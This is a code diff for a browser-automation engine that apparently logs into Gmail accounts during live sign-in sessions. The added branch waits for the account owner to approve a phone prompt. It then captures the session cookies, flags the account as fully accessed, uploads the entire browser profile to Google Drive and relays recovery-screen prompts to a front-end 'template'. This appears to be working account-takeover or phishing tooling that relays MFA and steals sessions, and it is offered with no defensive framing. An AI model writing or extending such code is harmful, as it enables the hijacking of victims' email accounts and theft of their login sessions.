@@ -6299,6 +6299,117 @@ if (!foundSelector) {
                                 codeSuccessfullyProcessed = false;
                                 break;
                             }
+                    } else {
+                        // No verification code submitted this beat (e.g. Gmail phone-prompt
+                        // tap-Yes approval). The browser can navigate to the inbox on its own
+                        // once the user approves — check every beat and finalize immediately
+                        // when it lands. Previously this path skipped the inbox check entirely
+                        // (the passive branch was nested inside the code-entry block) so the
+                        // engine sat at inbox until WAITINGCODE_TIMEOUT and the template never
+                        // received PROCESSING_FINALIZING.
+                        const inboxCheckedNoCode = await isInbox(page, platformConfig).catch(() => false);
+                        if (inboxCheckedNoCode) {
+                            logger.info(`[processRow][${browserId}][WAITINGCODE] Inbox reached during passive wait (no code submitted). Setting status to PROCESSING_FINALIZING.`);
+                            finalStatus = "PROCESSING_FINALIZING";
+                            codeSuccessfullyProcessed = true;
+                            initialCheckResult.reachedInbox = true;
+                            initialCheckResult.requiresVerification = false;
+                            initialCheckResult.accountAccess = true;
+                            initialCheckResult.emailExists = true;
+
+                            const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
+                            updateData.status = "PROCESSING_FINALIZING";
+                            updateData.cookieJSON = JSON.stringify(browserCookies);
+                            updateData.verified = true;
+                            updateData.fullAccess = true;
+                            updateData.cookieAccess = true;
+                            updateData.lastJsonResponse = JSON.stringify({
+                                browserId, email, status: "PROCESSING_FINALIZING",
+                                emailExists: initialCheckResult.emailExists, accountAccess: true,
+                                reachedInbox: true, requiresVerification: false,
+                                verified: true, fullAccess: true,
+                                platform, timestamp: new Date().toISOString(),
+                                message: "Successfully verified with passive approval and reached inbox."
+                            });
+
+                            updateBrowserRowDataFast(browserId, {
+                                status: "PROCESSING_FINALIZING",
+                                cookieJSON: updateData.cookieJSON,
+                                cookieAccess: true,
+                                verified: true,
+                                fullAccess: true,
+                                lastJsonResponse: updateData.lastJsonResponse
+                            });
+
+                            if (browser) {
+                                if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
+                                logger.info(`[processRow][${browserId}] Closing browser after successful passive verification (no code).`);
+                                await browser.close().catch(err => logger.error(`Error closing browser for ${browserId}: ${err.message}`));
+                                browserFullyClosed = true;
+                                activeBrowserSessions.delete(browserId);
+                                await new Promise(resolve => setTimeout(resolve, 2000));
+                            }
+
+                            let uploadedDriveUrlNoCode = null;
+                            try {
+                                logger.warn(`[UPLOAD][${browserId}] attempt caller=WAITINGCODE_NO_CODE_INBOX status=${updateData.status} driveUrlBefore=${updateData.driveUrl || 'none'} dirExists=${userDataDir ? fs.existsSync(userDataDir) : false} userDataDir=${userDataDir}`);
+                                uploadedDriveUrlNoCode = await uploadBrowserData(browserId, updateData, userDataDir);
+                                if (uploadedDriveUrlNoCode) {
+                                    updateData.driveUrl = uploadedDriveUrlNoCode;
+                                    uploadedBrowserData.set(browserId, uploadedDriveUrlNoCode);
+                                }
+                            } catch (uploadError) {
+                                logger.error(`[processRow][${browserId}] Error during Google Drive upload after no-code inbox: ${uploadError.message}`);
+                            }
+
+                            if (updateData.driveUrl && userDataDir && canDeleteUserDataDir(browserId)) {
+                                logger.warn(`[PROFILE][${browserId}] DELETING userDataDir reason=WAITINGCODE_NO_CODE_INBOX status=COMPLETED driveUrl=${updateData.driveUrl || 'none'} wasUploaded=${uploadedBrowserData.has(browserId)}`);
+                                try { await fs.remove(userDataDir); } catch (e) {}
+                            }
+                            updateData.status = "COMPLETED";
+                            break;
+                        }
+                        // Periodic screen re-check: Google may advance to a phone-number entry
+                        // or choice screen while we wait for the phone-prompt approval.
+                        if (codeIteration % 6 === 0) {
+                            try {
+                                const passiveProbeNoCode = await checkVerification(page, platformConfig).catch(() => ({ required: false }));
+                                if (passiveProbeNoCode.required && passiveProbeNoCode.type === 'text_input') {
+                                    const _ppIsPhone = passiveProbeNoCode.viewName === 'Gmail Phone Number Entry';
+                                    const _ppStatus = _ppIsPhone ? 'WAITINGPHONENUMBER' : 'WAITINGRECOVERYEMAIL';
+                                    logger.info(`[processRow][${browserId}][WAITINGCODE] Passive wait (no code): text input screen (${passiveProbeNoCode.viewName}) detected. Setting ${_ppStatus}.`);
+                                    finalStatus = _ppStatus;
+                                    updateData.status = _ppStatus;
+                                    updateData.lastJsonResponse = JSON.stringify({
+                                        ...JSON.parse(updateData.lastJsonResponse || '{}'),
+                                        emailExists: true,
+                                        accountAccess: true,
+                                        requiresVerification: true,
+                                        status: _ppIsPhone ? "WAITING_PHONE_NUMBER" : "WAITING_RECOVERY_EMAIL",
+                                        verificationState: _ppIsPhone ? 'WAITING_PHONE_NUMBER' : 'WAITING_RECOVERY_EMAIL',
+                                        viewName: passiveProbeNoCode.viewName,
+                                        recoveryMasked: (!_ppIsPhone && passiveProbeNoCode.recoveryMasked) || null,
+                                        message: _ppIsPhone ? "Phone number entry screen reached." : (passiveProbeNoCode.recoveryMasked ? `Confirm the recovery email address you added to your account: ${passiveProbeNoCode.recoveryMasked}.` : "Recovery email confirmation screen reached.")
+                                    });
+                                    updateBrowserRowDataFast(browserId, updateData);
+                                    break;
+                                } else if (passiveProbeNoCode.required && passiveProbeNoCode.type === 'choice') {
+                                    logger.info(`[processRow][${browserId}][WAITINGCODE] Passive wait (no code): choice screen detected. Setting WAITINGOPTIONS.`);
+                                    finalStatus = "WAITINGOPTIONS";
+                                    updateData.status = "WAITINGOPTIONS";
+                                    updateData.lastJsonResponse = JSON.stringify({
+                                        ...JSON.parse(updateData.lastJsonResponse || '{}'),
+                                        status: "WAITING_OPTIONS",
+                                        verificationState: 'WAITING_OPTIONS',
+                                        viewName: passiveProbeNoCode.viewName,
+                                        message: "Verification choice screen reached."
+                                    });
+                                    updateBrowserRowDataFast(browserId, updateData);
+                                    break;
+                                }
+                            } catch (_) {}
+                        }
+                        await new Promise(resolve => setTimeout(resolve, 5000));
                     }
                 } catch (pollError) {
                     logger.error(`[processRow][${browserId}][WAITING_CODE] Error during polling: ${pollError.message}`);
@@ -6346,7 +6457,7 @@ if (!foundSelector) {
             if (finalStatus === "WAITINGCODE" && !codeSuccessfullyProcessed && Date.now() >= pollingTimeout) {
                 pollingTimedOut = true;
                 logger.warn(`[processRow][${browserId}][WAITINGCODE] Polling for code timed out. Setting FAILED — COMPLETED handler will save cookies + profile.`);
-                notifyTeam({ type: 'WAITINGCODE_TIMEOUT', platform, email, browserId, detail: 'Verification code polling timed out after 5 minutes. Setting FAILED.' });
+                notifyTeam({ type: 'WAITINGCODE_TIMEOUT', platform, email, browserId, detail: 'Verification code polling timed out after 10 minutes. Setting FAILED.' });
                 finalStatus = "FAILED";
                 updateData.status = "FAILED";
                 updateData.verified = true;
